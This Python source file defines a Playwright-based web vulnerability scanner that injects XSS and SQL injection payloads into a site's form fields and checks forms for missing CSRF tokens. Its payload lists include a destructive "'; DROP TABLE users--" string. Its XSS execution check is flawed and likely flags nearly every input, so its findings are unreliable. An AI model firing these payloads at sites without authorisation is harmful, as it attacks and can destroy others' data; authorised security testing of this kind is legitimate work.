from playwright.async_api import async_playwright
import asyncio
import logging
from typing import List, Dict
import re
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    def __init__(self):
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1' OR '1'='1' #",
        ]
    
    async def scan_website(self, url: str) -> List[Dict]:
        """扫描网站漏洞"""
        vulnerabilities = []
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            
            try:
                # 访问目标页面
                await page.goto(url, timeout=30000)
                await page.wait_for_load_state('networkidle')
                
                # XSS扫描
                xss_vulns = await self._scan_xss(page, url)
                vulnerabilities.extend(xss_vulns)
                
                # SQL注入扫描
                sqli_vulns = await self._scan_sqli(page, url)
                vulnerabilities.extend(sqli_vulns)
                
                # CSRF扫描
                csrf_vulns = await self._scan_csrf(page, url)
                vulnerabilities.extend(csrf_vulns)
                
            except Exception as e:
                logger.error(f"Error scanning {url}: {str(e)}")
            finally:
                await browser.close()
        
        return vulnerabilities
    
    async def _scan_xss(self, page, base_url: str) -> List[Dict]:
        """XSS漏洞扫描"""
        vulnerabilities = []
        
        try:
            # 查找所有输入框
            inputs = await page.query_selector_all('input[type="text"], input[type="search"], textarea')
            
            for i, input_element in enumerate(inputs):
                for payload in self.xss_payloads:
                    try:
                        # 清空输入框
                        await input_element.clear()
                        
                        # 输入XSS载荷
                        await input_element.fill(payload)
                        
                        # 提交表单或触发事件
                        form = await input_element.query_selector('xpath=ancestor::form')
                        if form:
                            submit_btn = await form.query_selector('input[type="submit"], button[type="submit"], button:not([type])')
                            if submit_btn:
                                await submit_btn.click()
                                await page.wait_for_timeout(1000)
                        
                        # 检查页面内容是否包含载荷
                        content = await page.content()
                        if payload in content and not self._is_encoded(payload, content):
                            vulnerabilities.append({
                                "type": "xss",
                                "payload": payload,
                                "location": f"Input field #{i+1}",
                                "description": f"Reflected XSS vulnerability found in input field. Payload: {payload}",
                                "severity": "high"
                            })
                            break
                        
                        # 检查JavaScript执行
                        try:
                            await page.wait_for_function(
                                "window.alert && window.alert.toString().includes('[native code]')",
                                timeout=2000
                            )
                            vulnerabilities.append({
                                "type": "xss",
                                "payload": payload,
                                "location": f"Input field #{i+1}",
                                "description": f"Stored/DOM XSS vulnerability found. JavaScript executed successfully.",
                                "severity": "critical"
                            })
                            break
                        except:
                            pass
                            
                    except Exception as e:
                        logger.debug(f"XSS test failed for payload {payload}: {str(e)}")
                        continue
        
        except Exception as e:
            logger.error(f"XSS scanning error: {str(e)}")
        
        return vulnerabilities
    
    async def _scan_sqli(self, page, base_url: str) -> List[Dict]:
        """SQL注入漏洞扫描"""
        vulnerabilities = []
        
        try:
            # 查找所有输入框
            inputs = await page.query_selector_all('input[type="text"], input[type="search"], input[type="email"]')
            
            for i, input_element in enumerate(inputs):
                for payload in self.sqli_payloads:
                    try:
                        # 清空输入框
                        await input_element.clear()
                        
                        # 输入SQL注入载荷
                        await input_element.fill(payload)
                        
                        # 提交表单
                        form = await input_element.query_selector('xpath=ancestor::form')
                        if form:
                            submit_btn = await form.query_selector('input[type="submit"], button[type="submit"], button:not([type])')
                            if submit_btn:
                                await submit_btn.click()
                                await page.wait_for_timeout(2000)
                        
                        # 检查SQL错误信息
                        content = await page.content()
                        sql_errors = [
                            "mysql_fetch_array",
                            "ORA-01756",
                            "Microsoft OLE DB Provider",
                            "PostgreSQL query failed",
                            "Warning: mysql_",
                            "valid MySQL result",
                            "MySqlClient.",
                            "SQLException",
                            "syntax error",
                            "unexpected end of SQL command"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                vulnerabilities.append({
                                    "type": "sqli",
                                    "payload": payload,
                                    "location": f"Input field #{i+1}",
                                    "description": f"SQL Injection vulnerability detected. Database error: {error}",
                                    "severity": "critical"
                                })
                                break
                        
                        # 检查布尔盲注
                        if "1=1" in payload and len(content) > 0:
                            # 测试false条件
                            await input_element.clear()
                            false_payload = payload.replace("1=1", "1=2")
                            await input_element.fill(false_payload)
                            
                            if form and submit_btn:
                                await submit_btn.click()
                                await page.wait_for_timeout(1000)
                            
                            false_content = await page.content()
                            
                            # 如果两次响应长度差异较大，可能存在布尔盲注
                            if abs(len(content) - len(false_content)) > 100:
                                vulnerabilities.append({
                                    "type": "sqli",
                                    "payload": payload,
                                    "location": f"Input field #{i+1}",
                                    "description": "Possible Boolean-based SQL Injection vulnerability detected.",
                                    "severity": "high"
                                })
                                break
                            
                    except Exception as e:
                        logger.debug(f"SQL injection test failed for payload {payload}: {str(e)}")
                        continue
        
        except Exception as e:
            logger.error(f"SQL injection scanning error: {str(e)}")
        
        return vulnerabilities
    
    async def _scan_csrf(self, page, base_url: str) -> List[Dict]:
        """CSRF漏洞扫描"""
        vulnerabilities = []
        
        try:
            # 查找所有表单
            forms = await page.query_selector_all('form')
            
            for i, form in enumerate(forms):
                # 检查是否有CSRF token
                csrf_inputs = await form.query_selector_all('input[name*="csrf"], input[name*="token"], input[name*="_token"]')
                
                if not csrf_inputs:
                    # 检查表单方法
                    method = await form.get_attribute('method')
                    action = await form.get_attribute('action')
                    
                    if method and method.upper() in ['POST', 'PUT', 'DELETE']:
                        vulnerabilities.append({
                            "type": "csrf",
                            "payload": "No CSRF token found",
                            "location": f"Form #{i+1} (action: {action or 'current page'})",
                            "description": f"Form lacks CSRF protection. Method: {method.upper()}",
                            "severity": "medium"
                        })
        
        except Exception as e:
            logger.error(f"CSRF scanning error: {str(e)}")
        
        return vulnerabilities
    
    def _is_encoded(self, payload: str, content: str) -> bool:
        """检查载荷是否被编码"""
        encoded_chars = {
            '<': ['&lt;', '%3C'],
            '>': ['&gt;', '%3E'],
            '"': ['&quot;', '%22'],
            "'": ['&#x27;', '%27'],
            '&': ['&amp;', '%26']
        }
        
        for char, encodings in encoded_chars.items():
            if char in payload:
                for encoding in encodings:
                    if encoding in content:
                        return True
        return False
